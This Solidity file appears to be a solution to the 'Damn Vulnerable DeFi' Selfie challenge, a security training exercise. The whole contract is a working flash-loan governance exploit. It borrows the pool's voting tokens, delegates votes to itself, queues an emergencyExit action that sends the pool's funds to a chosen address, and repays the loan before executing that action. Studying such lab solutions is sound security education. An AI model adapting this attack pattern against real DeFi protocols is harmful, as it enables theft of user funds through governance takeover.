// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SelfiePool} from "./SelfiePool.sol";
import {ISimpleGovernance} from "./ISimpleGovernance.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";

contract ExploitSelfie is IERC3156FlashBorrower{
    address immutable recovery;
    // borrow all tokens in the pool
    uint256 constant VOTES_NEEDED = 1_500_000e18;

    SelfiePool pool;
    address immutable governance;
    DamnValuableVotes token;

    uint256 actionId;

    constructor(SelfiePool _pool, address _governance, address _recovery) {
        recovery = _recovery;
        pool = _pool;
        governance = _governance;
        token = DamnValuableVotes(address(pool.token()));
    }

    function onFlashLoan(address initiator, address /*token*/, uint256 amount, uint256 fee, bytes calldata /*data*/) 
        external 
        override 
        returns (bytes32) 
    {   
        require(msg.sender == address(pool), "Only pool can call");
        require(initiator == address(this), "Only this contract can initiate");

        // We have to delegate ourselves so we have voting power (check implementation of getVotes in OpenZeppelin Votes.sol)
        token.delegate(address(this));

        // queue the action with enough votes
        actionId = ISimpleGovernance(governance).queueAction(
            address(pool), // action target is the pool
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery) // We want to call emergencyExit on the pool with the recovery address
        );

        // repay the flash loan, let the pool pull the tokens back
        token.approve(address(pool), amount + fee); // fee is 0.

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    

    function exploitSetUp() external returns (bool) {
        // borrow tokens via flash loan to get temporary voting power
        bool success = pool.flashLoan(
            this,
            address(token),
            VOTES_NEEDED,
            ""
        );
        require(success, "Flash loan failed");
        return true;
    }

    function exploitCloseUp() external returns (bool) {
        // after waiting for the action delay, execute the queued action
        ISimpleGovernance(governance).executeAction(actionId);
        return true; 
    }
    
}